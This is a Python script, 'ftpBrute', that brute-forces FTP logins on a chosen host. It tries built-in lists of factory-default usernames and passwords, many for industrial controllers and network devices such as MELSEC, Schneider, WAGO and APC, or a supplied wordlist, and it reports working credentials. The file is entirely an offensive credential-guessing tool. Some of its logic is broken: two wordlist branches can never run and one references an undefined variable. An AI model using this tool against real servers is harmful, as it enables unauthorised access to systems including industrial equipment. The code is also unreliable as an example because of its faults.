import ftplib
import argparse

ftpserver = ftplib.FTP()

parser = argparse.ArgumentParser(prog='ftpBrute',
                                 description='Bruteforce FTP with wordlists or common built-in usernames/passwords',
                                 epilog='v1.0.1')

parser.add_argument('--host', help='Choose Host', type=str, required=True)
parser.add_argument('--port', help='Choose Port', type=int, required=True)

parser.add_argument('-u', '--username', help='Choose Username', type=str)
parser.add_argument('-p', '--password', help='Choose Password', type=str)

usernames = [
    "anonymous",
    "root",
    "root",
    "ftp",
    "admin",
    "localadmin",
    "admin",
    "apc",
    "admin",
    "Root",
    "Admin",
    "User",
    "Guest",
    "ftp",
    "admin",
    "a",
    "admin",
    "adtec",
    "admin",
    "none",
    "instrument",
    "user",
    "root",
    "default",
    "admin",
    "nmt",
    "admin",
    "supervisor",
    "user1",
    "avery",
    "IEIeMerge",
    "ADMIN",
    "beijer",
    "Admin",
    "admin",
    "admin",
    "root",
    "se",
    "admin",
    "device",
    "apc",
    "apc",
    "dm",
    "dmftp",
    "httpadmin",
    "user",
    "MELSEC",
    "QNUDECPU",
    "ftp_boot",
    "uploader",
    "ftpuser",
    "USER",
    "qbf77101",
    "ntpupdate",
    "sysdiag",
    "wsupgrade",
    "pcfactory",
    "loader",
    "test",
    "webserver",
    "fdrusers",
    "nic2212",
    "user",
    "su",
    "MayGion",
    "admin",
    "PlcmSpIp"
]

passwords = [
    "anonymous",
    "rootpasswd",
    "12hrs37",
    "b1uRR3",
    "admin",
    "localadmin",
    "1234",
    "apc",
    "nas",
    "wago",
    "wago",
    "user",
    "guest",
    "ftp",
    "password",
    "avery",
    "123456",
    "none",
    "admin12345",
    "dpstelecom",
    "instrument",
    "password",
    "password",
    "default",
    "default",
    "Janitza",
    "supervisor",
    "pass1",
    "avery",
    "eMerge",
    "12345",
    "beijer",
    "admin",
    "1234",
    "1111",
    "admin",
    "1234",
    "stingray",
    "apc",
    "apc",
    "ftp",
    "ftp",
    "fhttpadmin",
    "system",
    "MELSEC",
    "QNUDECPU",
    "ftp_boot",
    "ZYPCOM",
    "password",
    "USER",
    "hexakisoctahedron",
    "ntpupdate",
    "factorycast@schneider",
    "wsupgrade",
    "pcfactory",
    "fwdownload",
    "testingpw",
    "webpages",
    "sresurdf",
    "poiuypoiuy",
    "user00",
    "ko2003wa",
    "maygion.com",
    "9999",
    "PlcmSpIp"
]


parser.add_argument('-w', '--wordlist', help='Choose Wordlist', type=str)

args = parser.parse_args()

if not args.host:
    parser.print_help()

def bruteforce():
    #bruteforce with given values
    if args.username and args.password:
        print(f"Bruteforcing with custom credentials: {args.username}:{args.password}")
        try:
            ftpserver.connect(args.host, args.port)
            ftpserver.login(args.username, args.password)
            print(f"Success: {args.username}:{args.password}")
        except ftplib.all_errors as e:
            print(f"Failed: {args.username}:{args.password} - {e}")
    elif args.username:
        print(f"Bruteforcing with custom credentials: {args.username}")
        for pwd in passwords:
            try:
                ftpserver.connect(args.host, args.port)
                ftpserver.login(args.username, pwd)
                print(f"Success: {args.username}:{pwd}")
            except ftplib.all_errors as e:
                print(f"Failed: {args.username}:{pwd} - {e}")
    elif args.password:
        print(f"Bruteforcing with custom credentials: {args.password}")
        for user in usernames:
            try:
                ftpserver.connect(args.host, args.port)
                ftpserver.login(user, args.password)
                print(f"Success: {user}:{args.password}")
            except ftplib.all_errors as e:
                print(f"Failed: {user}:{args.password} - {e}")
    else:
        #bruteforcing with buildin list
        for user in usernames:
            for pwd in passwords:
                print(f"Bruteforcing with buildin credentials: {args.password}")
                try:
                    ftpserver.connect(args.host, args.port)
                    ftpserver.login(user, pwd)
                    print(f"Success: {user}:{pwd}")
                    break
                except ftplib.all_errors as e:
                    print(f"Failed: {user}:{pwd} - {e}")
                    continue

    if args.wordlist:
        try:
            with open(args.wordlist, 'r') as file:
                wordlist = file.readlines()
                for user in wordlist:
                    user = user.strip()
                    for pwd in passwords:
                        print(f"Bruteforcing with wordlist: {user}:{pwd}")
                        try:
                            ftpserver.connect(args.host, args.port)
                            ftpserver.login(user, pwd)
                            print(f"Success: {user}:{pwd}")
                            break
                        except ftplib.all_errors as e:
                            print(f"Failed: {user}:{pwd} - {e}")
        except FileNotFoundError:
            print(f"Error: Wordlist file {args.wordlist} not found.")
        except Exception as e:
            print(f"Error: {e}")
    elif args.username and args.wordlist:
        try:
            with open(args.wordlist, 'r') as file:
                for pwd in passwords:
                    print(f"Bruteforcing with wordlist: {args.username}:{pwd}")
                    try:
                        ftpserver.connect(args.host, args.port)
                        ftpserver.login(args.username, pwd)
                        print(f"Success: {args.username}:{pwd}")
                        break
                    except ftplib.all_errors as e:
                        print(f"Failed: {args.username}:{pwd} - {e}")
        except FileNotFoundError:
            print(f"Error: Wordlist file {args.wordlist} not found.")
        except Exception as e:
            print(f"Error: {e}")
    elif args.password and args.wordlist:
        try:
            with open(args.wordlist, 'r') as file:
                for user in usernames:
                    print(f"Bruteforcing with wordlist: {user}:{args.password}")
                    try:
                        ftpserver.connect(args.host, args.port)
                        ftpserver.login(user, pwd)
                        print(f"Success: {user}:{args.password}")
                        break
                    except ftplib.all_errors as e:
                        print(f"Failed: {user}:{args.password} - {e}")
        except FileNotFoundError:
            print(f"Error: Wordlist file {args.wordlist} not found.")
        except Exception as e:
            print(f"Error: {e}")
    else:
        print("Error")

bruteforce()
